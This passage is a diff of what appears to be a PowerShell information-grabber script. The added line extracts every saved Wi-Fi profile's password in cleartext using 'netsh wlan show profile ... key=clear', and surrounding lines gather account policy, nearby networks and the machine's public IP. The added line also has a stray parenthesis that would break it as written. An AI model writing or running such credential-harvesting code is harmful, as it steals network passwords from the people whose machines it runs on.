@@ -44,7 +44,7 @@ $password = net accounts | Format-List  | Out-String
 #########################################################
 #Wifi stuff
 $nbwifi = netsh wlan show networks mode=bssid | Format-List  | Out-String
-$wifipswrd = netsh wlan show profiles | Format-List  | Out-String
+$wifipswrd = netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 #########################################################
 #IP stuff
 $PublicIP = (Invoke-WebRequest -Uri "https://api.ipify.org").Content
